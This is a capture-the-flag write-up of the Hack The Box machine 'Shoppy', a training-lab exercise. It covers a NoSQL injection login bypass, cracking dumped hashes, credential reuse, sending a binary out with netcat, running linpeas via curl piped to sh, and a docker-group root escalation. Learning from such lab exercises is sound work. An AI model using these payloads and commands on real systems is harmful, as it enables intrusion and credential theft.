---
title: Hack The Box writeup: Shoppy
date: 2023-03-27
Categories: [CTF, Offensive]
tags: [HackTheBox, Writeup]
---

This post is a part of my Machine Monday challenge series.
Each monday I'll post a writeup on a new machine that I've recently exploited. Click here to learn about how the challenge works, or tell me what I should study next!

## Adding the domain to `/etc/hosts`

In order to properly resolve our host, we'll need to map it's IP to a hostname using local DNS. This way, we won't need to type the IP address each time we'd like to communicate with the machine. In order to do this, we'll need to use the command `sudo vi /etc/hosts`, type in our password, and follow the convention within the file (ip address [TAB] domain name) to add it to the file on the next line like so:

![cc5bdb0ba49704347c5af2d82baa69b5.png](:/b4341fbc69554f70984c8e4ea01b73f5)
*Make sure that your ip matches up with the instance HTB gave you! Don't copy mine!* 

## Recon

## Nmap

For speed purposes, I use a very quick nmap scan to grab all of the open ports on the machine (and nothing more). The `-p-` flag is great for this. **Without `-p-`, I'd only scan for the most common 1000 ports instead of all 65,535 TCP ports. This can be a fatal mistake in the enumeration phase.**

Here's the command we'll use: 

`nmap -p- shoppy.htb`

### Quick Nmap output
```
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up (0.031s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat

Nmap done: 1 IP address (1 host up) scanned in 280.71 seconds
```
*Note that these ports are all TCP only! If we wanted to scan UDP we'd use the -sU option.*

Now that we have identified the ports avalible we know that the ports avalible are 22, 80, and 9093. With this information, we can infer that there's a webserver, and an SSH client running on this machine. However, there's another port that I don't recognize. Let's look into all of them, but keep an eye on our out of place port.

## Full nmap

My full nmap scan uses the following options: 

`nmap -sCV -p 22,80,9093 -o shoppy.nmap shoppy.htb`

`-sV`: Detects service versions
`-sC`: Runs safe scripts (using the NSE)
`-p`: Scans selected ports
`-o`: Outputs in normal format. (With filename "shoppy.nmap")

```
# Nmap 7.92 scan initiated Wed Dec 14 19:10:22 2022 as: nmap -sCV -p 22,80,9093 -o shoppy.nmap shoppy.htb
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up (0.093s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp   open  http     n17/12/2022 16:08ginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title:             Shoppy Wait Page        
9093/tcp open  copycat?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Thu, 15 Dec 2022 00:10:27 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 11
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 11
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 2.8354e-05
|     go_gc_duration_seconds{quantile="0.25"} 9.8767e-05
|_    go_gc_d
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9093-TCP:V=7.92%I=7%D=12/14%Time=639A65FF%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2A82,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:
SF:\x20text/plain;\x20version=0\.0\.4;\x20charset=utf-8\r\nDate:\x20Thu,\x
SF:2015\x20Dec\x202022\x2000:10:27\x20GMT\r\n\r\n#\x20HELP\x20go_gc_cycles
SF:_automatic_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\
SF:x20generated\x20by\x20the\x20Go\x20runtime\.\n#\x20TYPE\x20go_gc_cycles
SF:_automatic_gc_cycles_total\x20counter\ngo_gc_cycles_automatic_gc_cycles
SF:_total\x2011\n#\x20HELP\x20go_gc_cycles_forced_gc_cycles_total\x20Count
SF:\x20of\x20completed\x20GC\x20cycles\x20forced\x20by\x20the\x20applicati
SF:on\.\n#\x20TYPE\x20go_gc_cycles_forced_gc_cycles_total\x20counter\ngo_g
SF:c_cycles_forced_gc_cycles_total\x200\n#\x20HELP\x20go_gc_cycles_total_g
SF:c_cycles_total\x20Count\x20of\x20all\x20completed\x20GC\x20cycles\.\n#\
SF:x20TYPE\x20go_gc_cycles_total_gc_cycles_total\x20counter\ngo_gc_cycles_
SF:total_gc_cycles_total\x2011\n#\x20HELP\x20go_gc_duration_seconds\x20A\x
SF:20summary\x20of\x20the\x20pause\x20duration\x20of\x20garbage\x20collect
SF:ion\x20cycles\.\n#\x20TYPE\x20go_gc_duration_seconds\x20summary\ngo_gc_
SF:duration_seconds{quantile=\"0\"}\x202\.8354e-05\ngo_gc_duration_seconds
SF:{quantile=\"0\.25\"}\x209\.8767e-05\ngo_gc_d")%r(HTTPOptions,2A82,"HTTP
SF:/1\.0\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20version=0\.0\.4;\
SF:x20charset=utf-8\r\nDate:\x20Thu,\x2015\x20Dec\x202022\x2000:10:27\x20G
SF:MT\r\n\r\n#\x20HELP\x20go_gc_cycles_automatic_gc_cycles_total\x20Count\
SF:x20of\x20completed\x20GC\x20cycles\x20generated\x20by\x20the\x20Go\x20r
SF:untime\.\n#\x20TYPE\x20go_gc_cycles_automatic_gc_cycles_total\x20counte
SF:r\ngo_gc_cycles_automatic_gc_cycles_total\x2011\n#\x20HELP\x20go_gc_cyc
SF:les_forced_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\
SF:x20forced\x20by\x20the\x20application\.\n#\x20TYPE\x20go_gc_cycles_forc
SF:ed_gc_cycles_total\x20counter\ngo_gc_cycles_forced_gc_cycles_total\x200
SF:\n#\x20HELP\x20go_gc_cycles_total_gc_cycles_total\x20Count\x20of\x20all
SF:\x20completed\x20GC\x20cycles\.\n#\x20TYPE\x20go_gc_cycles_total_gc_cyc
SF:les_total\x20counter\ngo_gc_cycles_total_gc_cycles_total\x2011\n#\x20HE
SF:LP\x20go_gc_duration_seconds\x20A\x20summary\x20of\x20the\x20pause\x20d
SF:uration\x20of\x20garbage\x20collection\x20cycles\.\n#\x20TYPE\x20go_gc_
SF:duration_seconds\x20summary\ngo_gc_duration_seconds{quantile=\"0\"}\x20
SF:2\.8354e-05\ngo_gc_duration_seconds{quantile=\"0\.25\"}\x209\.8767e-05\
SF:ngo_gc_d");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 14 19:12:03 2022 -- 1 IP address (1 host up) scanned in 100.75 seconds
```

## Port 9093

9093 is a wierd port with an unidentified service. I'll revisit the strings later to see if I can get it to snag something, but for now, I'll interact with the port directly:

```
┌─[sshad0w@SSHad0w]─[~/Documents/ctf/htb/shoppy]
└──╼ $nc shoppy.htb 9093
ls
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request
```

Seems to be HTTP based. [I can tell it's HTTP based becuase I notice that the response fit the protocol.](https://dev.to/sshad0w/3d2r-february-web-application-basics-43al)

Maybe that's why the protocol was dubbed "copycat". It could be a "copycat service" made to look like HTTP. Since it seems to be HTTP, I'll go ahead and visit it in a browser.

![Screenshot of port 9093](:/1d527e2ce8f9412384a4d99916f296e4)

The browser gives me all of these weird messages. My best guess is that it's written in Go considering it says "Go runtime" at the top of the page.

At the very bottom of the page, there's the following line:

![57278404bc3e3b4ac9a6ebf29d565cce.png](:/b8e71352edf54eb9a3a218a74bab1b14)

Version numbers are always good to follow, so I chased the rabbit down the hole and googled the following:

```
playbooks_plugin_system_playbook_instance_info{Version="1.29.1"} 1
```

According to a few sites, this application is a plugin written in go made to monitor memory usage.

[After a bit, I found that this is made to monitor Go apps.](https://scene-si.org/2018/08/06/basic-monitoring-of-go-apps-with-the-runtime-package/)

(References to `alloc` and `numGC` are both in the article mentioned above)

[I found something else that looks familiar.](https://github.com/timescale/promscale/blob/master/docs/metrics.md)
![Similar messages from a go package](:/bb557ab01a5d423ba16f995634a201ad)

I cross referenced the error with the word "playbook" (because it stood out to me as application specific language), and most of my searches linked back to something called "mattermost".

![mattermost searches](:/1890773e88c14bea895a2b74c89a7ac5)

I felt like I was in the right palce since the words "playbook" and "channel" matched up.

## So what is mattermost?

Now that I've found what's running, Let's actually take a second to understand what it is.

![Mattermost Description](:/3789eb62d8d340bc9d9c08358c79c517)

Mattermost seems to be an open source software development solution that allows people to collaborate their efforts without having to pay for a service like Jira, confluence, or any other enterprise level tool. Understanding it's intended purpose will help us understand how to triage it's importance and assess possibly weakpoints later on. We'll also take note that it's open source, as this may allow us to look through the code for clues on exploitation later.

## Mattermost Playbooks

According to the docs, playbooks are basically crontabs within the scope of mattermost. Or in their words: **"Build and configure repeatable processes to achieve specific and predictable outcomes."**

![fbabb872d3e8cf0cade3acdab21bbbdd.png](:/ad9e1561a362431bb0897dbec92e2fd2)

[Here's more of the documentation](https://docs.mattermost.com/playbooks/running-playbooks.html)

Why did I take note of this? Any time I see code automatically being run without human interaction, at specific time intervals, or when certain conditions are met, I try to take note of what it takes to trigger that code to see if can edit it, or force it to execute outside of it's typical context, I may be able to gain access to information I'm not privy to. 

Things like stored procedures, cron jobs, or any conditional arguments linked to time based execution are always interesting things to take note of, and it seems like these playlists can  "Build and configure **repeatable processes** to achieve specific and predictable outcomes."

After finishing the machine, I noticed that this was not the path to take to Hack this box, but I still wonder if there's something I'd be able to leverage here. Maybe I'll do some testing and discover something new.

## Port 80

Let's have a look at port 80.

![f77adb190252821c46e971f72ebbc548.png](:/1060cb2dddc942239d5fcc8803f45ef1)

It's a pretty little countdown timer. Let's check `robots.txt`.

![622c5dc741dcc3172e4fe87fb416c807.png](:/bc6563eede314d67a73ea56218691693)

> Editors note: On my first pass, I dismissed this as nothing but an error. I simply figured that this gave no more information than "this page doesn't exist". After some research, I learned that this page *does* give me information. I just didn't know what to look for. The "Cannot GET /page" format is actually native to the NodeJs framework. If I had have understood that information earlier, I would have progressed a lot faster on this machine, as this information would soon be crucial to exploitation. If you didn't know this, make sure you keep your eyes peeled for web framework error messages! 

## Login

After manually fuzzing the pages, I found the `/login` page. 

![6a25af14f66a951517169f4d3a7ee139.png](:/d2fa8b2599e546ce9b9861bed079011a)

Whenever I see a login page (presuming no logging is present), I always try simple default credentials, or common ones like variations of `password`, `admin` and other things like that.

![9b2ac9763aca0e98846ba8f35e4c3223.png](:/547a07b9c6a941cb94b567cb1c8a744a)

It seems like this is configured with a strong passphrase, so I won't be able to break it that way.

`http://shoppy.htb/login?error=WrongCredentials`

![9eebd498d3b752b44ca7300752549d44.png](:/853a4b9333ba411794b6bd3342d101c5)

Hm... How do I exploit this?

## NoSQL injection 

Since the backend is written in NodeJS, a good assumption that any backend database is written using a noSQL DB like mongoDB. With this assumption, we can try to learn how to trigger a noSQL injection vulnerability. [Without going too far in the details](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf), the difference between the classic SQL injection and it's noSQL variant is where we're attacking. Since mongoDB is handled at the application level (since mongoDB and NodeJS couple well together), [we're actually attacking the application instead of an inependent database.](https://nullsweep.com/a-nosql-injection-primer-with-mongo/) That's a very high level and broad statement, [but there's more specific information on the internet.](https://www.imperva.com/learn/application-security/nosql-injection/#:~:text=While%20SQL%20injection%20executes%20in,string%20into%20an%20API%20call.) 

After many attempts, I finally found an exploit string that worked for me:

`username=admin' || 'a'=='a&password=hello`

![bfc304a5718e0eeb0bc39950b14673b1.png](:/88288c3f093f4aa4a13c39f9e3a60d6f)

![5507c08fe5b43a27bdd7ad7d50543477.png](:/0ee8a1fcd0f34f00a92e3134d05d5b30)

I tested this using Burp Suite, but it's also possible to manually exploit via the login page. Without parameterization, it looks like this:

```
admin' || 'a'=='a
```

## /admin

We're now met with the admin interface of the shoppy app:

![46d467b1f356274dd01d9e87d6d32106.png](:/91a745428ab649bcb552028198607348)

We can click the "search" button.

![05ba4f01e1cff2a4fdb4a70e108ae411.png](:/fa2d91fc3bad41a4b20dc4766499511f)

 Using the exploit string from before, we can see all users in the DB:

![7dc6cd0552f03256a5e8e83bcc96bfa6.png](:/3b807aeb057b4fb5a3b860181ee7e292)

Since our payload dumps the entire database, we receive the username and password hashes of all of the DB users:

![16e2439bbac9bed93756a5c065d3218a.png](:/62ad29d3822b43638573bb8a6398f5bd)

```json
[{
	"_id":"62db0e93d6d6a999a66ee67a",
  "username":"admin",
	"password":"23c6877d9e2b564ef8b32c3a23de27b2"
 },
 {
	 "_id":"62db0e93d6d6a999a66ee67b",
  "username":"josh", 
	 "password":"6ebcea65320589ca4f2f1ce039975995"
 }
]
```

Since we're already logged in as admin, we'll login to `Josh` to see if there's any new information avalible to us.

## Identifying the hashes

Before we try logging into the "Josh" user, we'll need to identify which algorithm they use in order to crack them. There are many tools to do this (such as `hashid`, `hashcat`, and `cyberchef`), but we can also throw them into any online hash cracker to see if it will do the heavy lifting for us.

![914af8f2abe8d1bd9ff112b0b7d9cc70.png](:/a0354f13633a47709b99273cf8f838d2)


```
6ebcea65320589ca4f2f1ce039975995	md5	remembermethisway
```

Nice! So we got Josh's password without much hard work. Again, it's important that we understand how to use hashcat, but once we have that basic knowlege, online tools are fairly helpful as well. If you'd like to learn how to use `hashcat`, you can read my writeup on [Previse]().

Now that we have the cleartext password, we'll put it in our notes under "found credentials". We'll remember his password this way (Pun intended!)

## Matermost

I'm not sure what to do, but I remember mattermost being on this machine, so I looked at documentation on how to authenticate, and [I found  a page that tells me more about authentication.](https://docs.mattermost.com/welcome/sign-in.html)

Basically, if mattermost is self hosted, it will most likely be held on a domain that looks like the following: 

![a1bd93e00f48894ec74ca0dfdf4440bb.png](:/430678671c964de5a40cba99d3e4f79e)

## Gobuster 

So I'm going to try looking for vhosting using gobuster. (I'll have to look for virtual hosts given that it's on a *.shoppy.htb scheme site)

```
gobuster vhost -u shoppy.com -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shoppy.com
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/12/17 16:33:50 Starting gobuster in VHOST enumeration mode
===============================================================
                              
===============================================================
2022/12/17 16:34:34 Finished
===============================================================
```

Gobuster turned out to be a bust, but I took a guess and typed http://mattermost.shoppy.htb/ and I got a response back: 

![c8372fb670fda26c9b444eb6c151179b.png](:/6957d4322b584099922ff1401f7149fa)

## Mattermost.shoppy.htb

After adding that to the `/etc/hosts` file, we get this page:

![5b06723015730f7dfcfec89e0a21fecc.png](:/eabf64af92ce4366976c742cec7f26b6)

Let's try logging in with the credentials we learned earlier:

![c7c4a68dbfa8bfacb5386b0c7af924da.png](:/66810f79b963437480925d8e94382b2c)

## Authenticated mattermost enumeration

Great! Now that we're logged into the environment, we can look around in thier messages and learn more about the environment.

![c2e9cc8c9925bbd0dfbae9a70c8c65a2.png](:/50d15cabb4064d0fad30b097fdbf62e5)

Don't forget to log new usernames/accounts in your notes.

![f86e329fc0673178fe388820a5d0aafe.png](:/344b66a8614d493a98df6966fc69c7b8)

So far, I see 4 accounts. 

We have Josh, Jess, Jager, and System.

![933de3a6bcf35f61c1b16561bd6b1c1e.png](:/d850eac62b02434dba4d72fbe8cd05c7)

![87fe985c305263fe71d3f8df7f841af8.png](:/4077835dfa774ac2b38434ce59a54a8b)

Hello sysadmin/CEO!

This *might* be our target later.

Let's poke around look at the business logic before we try to find exploits.

*While messing around with the webapp, I found the dark theme! Feel free to change it if it's more comfortable on your eyes ;)*

## Channels

If you're familiar with discord or slack, mattermost will feel quite familiar to you. 

If you aren't, each tab on the left has different "channels" that discuss various subjects. Each of them focus on a single type of conversation.

![0069213d85de14981e805d36bec81be3.png](:/b1ba2aae3989496cbff6c0faf77a25b8)

Let's check out some of their messages.

![73021e28ac9b7ea2c276ff0f4e0ccd18.png](:/4abeb264e39749deaf56894842a4b8b9)

Josh and Jaeger talking about the Admin interface. 

There may be a password manager written in C++.

![93affb0cb1ca863b98f66656b2de92e3.png](:/cff18dcb753c4e2bbbfcdcb2c456f6a8)

Jess' cat. This could be a possible password later.

![e56fa2647da268265f3d41ed32823180.png](:/8aed41fde8a64bdb8437bdabfe33e116)

In a private channel called "Deploy machine", Jaeger tells josh to create an account for him.

I didn't see that account earlier. Maybe Josh hasn't created it yet.

Jaeger might reuse passwords. Let's logout of Josh's account and see if we can become CEO.

`jaeger`
`Sh0ppyBest@pp!`

![6101477327cd7b16805f266768ac5377.png](:/f97f669332764981ba6adb4312102b53)

![1b8c43564ed184aedef690bf0f3dc26c.png](:/f43627cbc5234e1e89992e14a5448472)

Neither worked.

I could try to login via SSH.

![54684d86751061e4e5f054fd166d47ca.png](:/a6abb66bdf294656bb9ece00c0f72620)

Sweet! I knew that password had to be used somewhere else.

![1914f9d47008aff987b0554388ab8d61.png](:/379327be8eee4f649f2b4a7e98cf2bbb)

There's our user.txt file.

## Linux Privesc Enumeration

After grabbing the user flag, I let's look in the `shoppy_start.sh` file.

![8ed0aecae0e321e50edc828c4cb993f7.png](:/d0747b78c0c14d6eb564046c65b1746b)

Running `sudo -l` gives us: 

![3bdcf9b25ba7bd576e990c1ee355ecef.png](:/55d844810fff4ce4a71dd985c7b980f4)

Seems like we need to inspect that file, and the ones around it.

![92966d7faf1c7ee10444d4ac80546aa8.png](:/aa7eae70ce214c02863e963f7fe22a87)

Other than the SUID, this directory is fairly locked down. 

This could be path injection. I'm not completley sure, but editing the $PATH variable might allow us to alter the execution flow of this script. I'll take a look at the permissions in this directory and see how the `.profile` is setup for each user.

![3776b2a33dce84e3624703e1cb06cbcd.png](:/be9afd482caa4f05bfdd3280d1596251)

`.profile`:

![662be760b2d5770b11ff6649f389860c.png](:/6bc4d76bc64b4eaeb6796eb85a03e16e)

Since we can't read the source code, let's try running the actual binary to learn more. Becuase this command needs to be run as another user, we'll have to invoke the binary with the following command:
`sudo -u deploy /home/deploy/password-manager`

![4cb85abcecc8add1d6ab8754ad650d9b.png](:/82361fe6954a4dbfaf7d0e80f71299dd)

So I guess we'll need some sort of master password?

Not sure if I'm expected to reverse engineer this, or if I'm supposed to try PATH injection. Since there's no way to know which commands were used to make this, path injection would be a shot in the dark. Maybe reverse engineering this file would give us some insight into how it's built, and we may even discover the master password itself.

## Transferring files with NC

Before we're able to reverse engineer the program, we'll need to move the file from the target machine, to ours. I've never demonstrated how to transfer a file in a situation like this, and there many ways. 

> *I'd like to mention that this method of transfer is **completley** unencrypted, and if your goal is to be stealthy while hacking, **this is not a secure method for transferring files.** Red teaming is an entirely different skill. You have to have tact to be tactical!

On our local machine, we'll run the following command to receive the data on port 4490 and name the file "password-manager".

`nc -nvlp 4490 > password-manager` (Local machine)

Your output should look like this: 
![b53b2c49a8be77ef72d09c490ceb5e35.png](:/ca4081ac832c412abd8b64dc6ce82b85)

On your target machine, you'll need the following command to push the file through:

`nc -nvq 0 10.10.14.9 4490 < /home/deploy/password-manager` (Remote machine)

Here's what it should look like when you receive a connection:
![1d795d3cc0916aa2179e78ebe497e16f.png](:/f36cc3bd0e99431cbb567c131ff47060)

> *I should also note that there is no progress bar with this transfer method, but waiting for a full minute should download the full file. (Checking the size of the file on the remote machine and target should be enough.)*

## Reverse engineering the file

Now that the file is on our machine, we can poke and prod at the file to figure out how it works, what it does, which libraries it uses and more relevant information. Although reverse engineering is it's own discipline, (which will be covered later) this post will only cover the basics of the skill.

### Creating a carbon copy (optional)

In my minimal forensics training, a cardinal rule that I've learned is to always make at least one copy of all artifacts before running tests on them. This prevents any original data from being damaged, destroyed, or otherwise modified. I created a copy with `cp password-manager password-manager2`, and I'll soley run tests on the copied version.

### Running the `file` command

Running the `file` command on unidentified binaries can help you identify what it is, how it was created and more.
![010fa23a640d71e04a2e3a1f3ef442d4.png](:/07dbef9b0cf04a24a2f7d7c4d33aec3b)
It seems to be a standard x64 ELF. Sweet!

## Strings

The strings command lists human readable strings inside the binary. This may give us information about how it was built, strings inside and possibly other valuble information that we can use to crack the program.

![7728aadf87b82d6f436d9780867cdf20.png](:/5947afd56bbb4146903891e4fcc9e4ed)

Interesting... So we know that it will cat the file.

Maybe if we modify the `cat` binary, we can use path injection to take advantage of this program. 

# Ghidra

While PATH injection could be our path, let's try reverse engineering the code itself.

Ghidra gives a listing of instructions along with the strings that we saw earlier.

![0ed258c16212f705afcd9663aca72409.png](:/d241fc5902224ff38af3211aaace327a)

You'll notice that we can simply scroll down and find the password harcoded in the file:

![6f4512a72fdb15e2d3c499a9f901a5a7.png](:/4d29eaa121bd4931b194cae5ae8a9046)
![8f3ea8cfd32243a8ca66e2f5f7deeed4.png](:/98e74de16b1e4457a175c62aa1e2ba7c)

Now, we see the "access granted" string like earlier!

![89c3ccf46981c0c9c7ba547e81737df5.png](:/8278069fbb744d52815182f66b567d75)

We can even see the execution flow of what happens after access is granted.

![1415341fa3baf2b754ed8d27501d52ca.png](:/239167781cf245f6b6a426f82db34cb1)

We also could have visited the function and viewed the password in the decompiler:

![440e2c25c8f92d754c180b0425867937.png](:/785724f95f3044438eb50c13230ab32c)

Let's go back to the copy and verify the password. 

![656b93b9bb4dc248bde0def18c3300fd.png](:/bb9f7adb3fb74bd99e0796834abcdd79)

It works! Let's do it for real this time on the target machine!

![a58d425aa5dfc4b529f9f2c3147f564a.png](:/28df0e920d244c59995dbdc764eda1bb)

After running the command earlier, we have the password to the "deploy" account! You can log on to the account via the `su` command, ssh into the account from the local machine, or you can exit your current shell, and log in to the `deploy` account manually.

![c3f78e1cc3f64254d7729a7c415d58bc.png](:/043833399a664878959e13d96c681127)

We're in. Now that we're on the other side, we can verify how the app was made.

![6e58dab930ba6aa97e7ec413a827c2a7.png](:/f93c9f5437a64fedafc32b1876b10856)
 
 The source code looks very similar to the decompiled version that we saw in Ghidra. Reverse engineering can be extremley powerful. 

## Shell upgrade for deploy acccount

Before we move on, we do have a slight problem. We have a dumb shell. 

What's a dumb shell? It's a shell that we can't we can't do much with. It's a shell that we can't use modern features like tab autocomplete, arrowkeys, screen clearing, and automatic resizing. 

You'll know you're in a dumb shell when you see that there's a minimal prompt, and pressing arrowkeys will give weird output.

![074cd5ed18d4fd1c65cefb3f561a61ca.png](:/e069fa136dd14de5b0a7d7aca62e2208)

While there are multiple ways to upgrade your shell, if there's a python install on the machine, you can use the following command to upgrade your shell:

```py
python -c 'import pty; pty.spawn("/bin/bash")'
```

Let's run the command and see what happens:

![59e66bdfb10633261083affb7b22b6eb.png](:/3c0446ef44d741e49fafc08d82b6b58f)

It seems that we don't have python on the machine. Let's try searching the machine for python and related binaries:

![d37b79ab6b87290ac604fcb2903c7b27.png](:/25262378a50d47b087e8ae890db80a35)

I considered creating a new shell with nc, but I decided to exit it all together and SSH into the machine. Technically, there were still ways to upgrade the shell, but I decided to make it easier on myself and SSH into the machine to have a copacetic experience. 

> *If you're ever on a red team assesment, this technique may not work! Sometimes you don't have the password for every user you log into, and in enterprise environments, SSH login evvents are recorded and logged.*

![c83fdd494f972c6c9de5247b2bcc8770.png](:/dbc9e1f89fbc49b8aa05804048b8051f)

I thought logging into the account direclty would give me a proper shell, but eventually I decided to just run `bash` for the upgrade. 

## Deploy Enumeration

Every time we log into a new account, we always need to enumerate.

![06060aee1d81d8e10e2b29c0bfae1a4e.png](:/f08dfe5c4b3049cf98ddb47b8c70403c)

No SUID binaries or crontab for this user. 

![cc6b2d2dc1963537bae44380013864bc.png](:/297fec373041484f8ec85c9f6ef633ca)

While there are linux privesc tools, I wanted to manually explore a bit before running them.

I found out two things: 

1) This is the account that controls mattermost
2) Containerd is on this machine.

Since Docker was mentioned earlier, I tried to see if anything was running. 

![ede699ec219cd085a2023e1d3cd1f091.png](:/2f14be76ac00498ea2dcb593cde7f5ff)

Nothing was running.

## Linpeas

I don't know what else to do, so I'm going to run linpeas. You can either tranfer the file like earlier using `nc`, transfer it with a simple `python` webserver, or you can grab it directly from github with `curl`.

Since we don't care about stealth, we can just run this:

```
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

If you'd like to use `python` (like I did), it will look something like this:

Client machine:
![67e3e72efdce3569e8aefa9a3e16c2dd.png](:/b4491f9057c94f27b98bd6e66f59fd07)

Target machine:
![25f38643b2505a212f06f7f7575786c4.png](:/a93c09b7375340eeb0c2a723489b6c29)

Linpeas has a lot of information in it (which means a lot of scrolling!), so I prefer to run it and send it to an output file to retreive and parse through at my leasure. In order to do this, I used the `>` redirect operator to write to a file called `output.txt`:

`bash linpeas.sh > output.txt`

Let's `less` the file: 

![4371f88ea2121066464c3efd54f84ac0.png](:/e56b35e30aff415a830ace317805cd26)

That output was very ugly, so I decided to go with `bash linpeas.sh -Nq > output2.txt` instead to remove color and banners.

![9b8828cec0f5fdbb8588340c19f78e09.png](:/9a244491ff8a4ba1ba7eb297c405e387)

Much better.

> *I completed this box a while ago, and since then I've read the linpeas documentation and learned that I could have used `less -r output.txt` for the first file, and it would have displayed with color. Agaiin, if you see something like the first picture, just use `less -r`!

After reading all of the linpeas output extensively and researching attack vectors, **I decided to ask someone for help.** I only mention this because I want to make sure that I remain honest about every single line of code I write, and I take that very seriously. It's alright to ask for help when you're stuck. No one is a master at everything instantly.

The hint I was given was "Did you see in which group deploy user is in?" The path was in the GID all along. Nothing super complicated, nothing extremely advanced. I just had to go back to the basics. 

## The group

We can find the group id by using the `id` command:

![f1b1ec939db7e887ba70a2c638e48971.png](:/92549ded2d994f73836b6906617ee30c)

```bash
deploy@shoppy:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

The GID shows that we're a part of the `docker` group.

[Let's search for files with our GID.](https://www.linuxquestions.org/questions/linux-general-1/how-to-find-all-a-gid%27s-files-19276/)

![3594679131ca9f77a7015310ae1ed681.png](:/ee8504aa59c44785b0b7c0cb4d52f95e)

> you can specify either with the -gid or -group options.. example:
$ **find / -name filename -gid 101**
or with the group name like:
$ **fine / -name filename -group users**
man find for more info....

`find / -name filename -gid 998`

![e962e2c4e88fd4685b8a861e700f7254.png](:/7a9c849b28394b929c4b020d1b87555b)

That's way too many "permission denied" messages. Let's see if we can filter that out with `grep`

`find / -name filename -gid 998 2>&1 | grep -v "Permission denied"`

`find / -name filename -gid 1001 2>&1 | grep -v "Permission denied"`

![745d3caee942702c927d4c4280fb3c40.png](:/cad618ed652d498cada18ec9d628e312)


That was a bust. Let's try a different approach. Since we're in the `docker` group, this means that we can run the actual docker binary. Maybe we should look to see if there are any ways to escalate to root using that program. 

After a bit of research, I found that one of my favorite sites had an entry for the docker binary. [GTFOBins is an amazing website to use when standard binaries have elevanted privleges like SUID, SGID, or something similar.](https://gtfobins.github.io/gtfobins/docker/) This site is a quick way to see if there are ways to break out of a restricted shell. 

WIthout further ado, let's GTFO of docker!

To acheive a root shell, all we have to do is run the following command: 

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

Before we run it, let's see what it actually does:



* `-v` Defines the volume to mount to. This allows us to share filesystems between the container and the host machine. When using docker operationally, I use docker's volume feature to ensure that my data persists between each deployment. 

	From the **dock**umentation itself:

	> -v or --volume: Consists of three fields, separated by colon characters (:). The fields must be in the correct order, and the meaning of each field is not immediately obvious.
	>
	>* In the case of named volumes, the first field is the name of the volume, and is unique on a given host machine. For anonymous volumes, the first field is omitted.
	>* The second field is the path where the file or directory are mounted in the container.
	>* The third field is optional, and is a comma-separated list of options, such as ro.

* `--rm` simply removes a container. 

* `-i` or `--interactive` is for keeping  STDIN open, even if the container isn't attatched.
* `-t` or `--tty` allocates a psuedo TTY that allows us to interact with the conainter like a normal shell.

* `alpine` is the base linux image used in many containers. This image is just to hold the shell. It has most basic functions and features of a standard unix machine.
* `chroot` is the actual command we're using to set the `/mnt` directory as our new root. 
* `sh` simply allows us to use `/bin/sh` as our interpreter for our shell

![3a658fbd73d98533001aa47a8c60b9d7.png](:/2f472c515461470da557da5f4f679cc3)

It worked! I'm so glad I wasn't afraid to ask for help. 

